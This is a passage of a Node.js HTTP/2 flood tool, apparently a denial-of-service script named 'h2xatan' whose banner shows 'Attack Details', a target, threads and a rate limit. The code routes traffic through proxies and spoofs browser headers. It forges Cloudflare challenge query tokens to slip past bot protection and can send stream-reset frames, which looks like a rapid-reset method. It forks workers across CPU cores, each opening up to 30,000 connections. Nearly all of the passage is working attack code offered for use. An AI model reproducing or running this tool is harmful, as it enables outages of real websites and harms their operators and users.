                            brandValue = `"Not;A=Brand";v="24", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
                        } else if (browserVersion === 129) {
                            brandValue = `"${wfwf}";v="${browserVersion}", "Not=A?Brand";v="8", "Chromium";v="${browserVersion}"`;
                        }

                        if (customuavalue) {
                            userAgent = customuavalue;
                        }

                        const isBrave = wfwf === 'Brave';

                        const acceptHeaderValue = isBrave
                            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
                            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';

                        const langValue = isBrave
                            ? 'en-US,en;q=0.9'
                            : 'en-US,en;q=0.7';

                        const secGpcValue = isBrave ? "1" : undefined;

                        const secChUa = `${brandValue}`;
                        const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6) + ".com" : refererValue;

                        const currentPath = paths[currentPathIndex];
						const randquery = getRandomInt(1, 3);
                        currentPathIndex = (currentPathIndex + 1) % paths.length;

                        const headers = Object.entries({
                            ":method": "GET",
                            ":authority": url.hostname,
                            ":scheme": "https",
                            ":path": randquery ? handleQuery(randquery) : (randpath() || currentPath || url.pathname)
                        }).concat(Object.entries({
                            "cache-control": Math.random() < 0.48 ? "no-cache" : "max-age=0",
                            ...(reqmethod === "POST" && { "content-length": "0" }),
                            ...(reqmethod === "POST" && { "content-type": allah1 }),
                            "sec-ch-ua": secChUa,
                            "sec-ch-ua-mobile": "?0",
                            "sec-ch-ua-platform": `"Windows"`,
                            "upgrade-insecure-requests": "1",
                            "user-agent": userAgent,
                            "accept": reqmethod === "POST" ? "*/*" : acceptHeaderValue,
                            ...(secGpcValue && { "sec-gpc": secGpcValue }),
                            "sec-fetch-site": currentRefererValue ? ref1 : "none",
                            "sec-fetch-mode": "navigate",
                            "sec-fetch-user": "?1",
                            "sec-fetch-dest": "document",
                            "accept-encoding": "gzip, deflate, br, zstd",
                            "accept-language": langValue,
                            "priority": "u=0, i",
                            ...(hcookie && { "cookie": hcookie }),
                            ...(currentRefererValue && { "referer": currentRefererValue }),
                            ...(parsedCookies && { "cookie": cookiesToInclude }),
                            ...customHeadersArray.reduce((acc, header) => ({ ...acc, ...header }), {})
                        }).filter(a => a[1] != null));

                        function randpath() {
                            if (useRandPath) {
                                return url.pathname + ememmmmmemmeme(5);
                            }
                        }

                        function handleQuery(query) {
                            if (query === '1') {
                                return url.pathname + '?__cf_chl_rt_tk=' + randstrr(43) + '-' + timestampString + '0.0.1.1-' + randstr(4);
                            } else if (query === '2') {
                                return url.pathname + '?' + ememmmmmemmeme(5) + '&' + ememmmmmemmeme(5);
                            } else if (query === '3') {
                                return url.pathname + '?q=' + ememmmmmemmeme(5) + '&' + ememmmmmemmeme(5);
                            } else {
                                return url.pathname;
                            }
                        }

                        const packedHeaders = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(headers)
                        ]);

                        tlsSocket.write(Buffer.concat([encodeFrame(streamId, 1, packedHeaders, 0x1 | 0x4 | 0x20)]));


                        if (reset && streamId >= 5 && (streamId - 5) % 10 === 0) {
                            tlsSocket.write(Buffer.concat([encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0)]));
                        }

                        streamId += 2;
                    }

                    async function scheduleNextRequest() {
                        const now = process.hrtime.bigint();
                        const elapsedTime = Number(now - lastRequestTime) / 1e6;
                        lastRequestTime = now;

                        await sendRequest();

                        const nextInterval = interval - elapsedTime;

                        if (nextInterval > 0) {
                            await delay(nextInterval);
                        }

                        await scheduleNextRequest();
                    }

                    scheduleNextRequest();
                }

                doWrite();
            }).on('error', () => {
                tlsSocket.end(() => tlsSocket.destroy());
            });

        });

        if (!username) {
            netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
        } else {
            const authString = Buffer.from(`${username}:${password}`).toString('base64');
            netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Authorization: Basic ${authString}\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
        }
    }).once('error', () => { }).once('close', () => {
        if (tlsSocket) {
            tlsSocket.end(() => tlsSocket.destroy());
            go();
        }
    });
}


if (cluster.isMaster) {
    const workers = {};

    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }))
    console.log(`
  _  __ ___  _________    _   __
  | |/ //   |/_  __/   |  / | / /
  |   // /| | / / / /| | /  |/ / 
 /   |/ ___ |/ / / ___ |/ /|  /
/_/|_/_/  |_/_/ /_/  |_/_/ |_/

> \x1b[1m\x1b[35mAttack Details:\x1b[0m   
> \x1b[1m\x1b[35mVersion:\x1b[0m [ \x1b[1m\x1b[91mh2xatan - ${ver}\x1b[0m ]
> ${Date().toLocaleString("us")}
> \x1b[1m\x1b[35mRequest Method:\x1b[0m [ \x1b[1m\x1b[91m${reqmethod}\x1b[0m ]
> \x1b[1m\x1b[35mTarget:\x1b[0m [ \x1b[1m\x1b[91m${target}\x1b[0m ]
> \x1b[1m\x1b[35mTime:\x1b[0m [ \x1b[1m\x1b[91m${time} sec\x1b[0m ]
> \x1b[1m\x1b[35mThreads:\x1b[0m [ \x1b[1m\x1b[91m${threads}x core\x1b[0m ]
> \x1b[1m\x1b[35mRatelimit:\x1b[0m [ \x1b[1m\x1b[91m${ratelimit} rq/s\x1b[0m ]
`)

    function shutdownCluster() {
        const workerIds = Object.keys(cluster.workers);

        workerIds.forEach((id) => {
            if (cluster.workers[id]) {
                cluster.workers[id].on('exit', () => {
                    if (Object.keys(cluster.workers).length === 0) {
                        process.exit();
                    }
                });
                cluster.workers[id].kill('SIGTERM');
            }
        });

        if (workerIds.length === 0) {
            process.exit();
        }
    }

    process.on('SIGINT', shutdownCluster);
    process.on('SIGTERM', shutdownCluster);
    process.on('SIGTSTP', () => {
        shutdownCluster();
    });

    cluster.on('exit', (worker, code, signal) => {
        if (signal !== 'SIGTERM' && signal !== 'SIGINT' && signal !== 'SIGTSTP') {
            cluster.fork({ core: worker.id % os.cpus().length });
        }
    });

    cluster.on("message", (worker, message) => {
        workers[worker.id] = [worker, message];
    });

    if (debugMode) {
        setInterval(() => {
            let statuses = {};
            for (let w in workers) {
                if (workers[w][0].state === "online") {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (!statuses[code]) statuses[code] = 0;
                            statuses[code] += st[code];
                        }
                    }
                }
            }
            console.clear();
            console.log(new Date().toLocaleString("us"), statuses);
        }, 1000);
    }

    setTimeout(() => process.exit(1), time * 1000);
    setTimeout(() => exit(), time * 1000);
} else {
    let conns = 0;
	let cons = 0;
    let i = setInterval(() => {
        if (conns < 30000) {
            conns++;
        } else {
            clearInterval(i);
            return;
        }
        go();
    }, 1);

    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 4) statusesQ.shift();
            statusesQ.push(statuses);
            statuses = {};
            if (process.connected) {
                process.send(statusesQ);
            }
        }, 250);
    }

    setTimeout(() => process.exit(1), time * 1000);
    setTimeout(() => exit(), time * 1000);

    process.on('SIGINT', cleanupAndExit);
    process.on('SIGTERM', cleanupAndExit);
    process.on('SIGTSTP', cleanupAndExit);

    function cleanupAndExit() {
        clearInterval(i);
        process.exit();
    }
}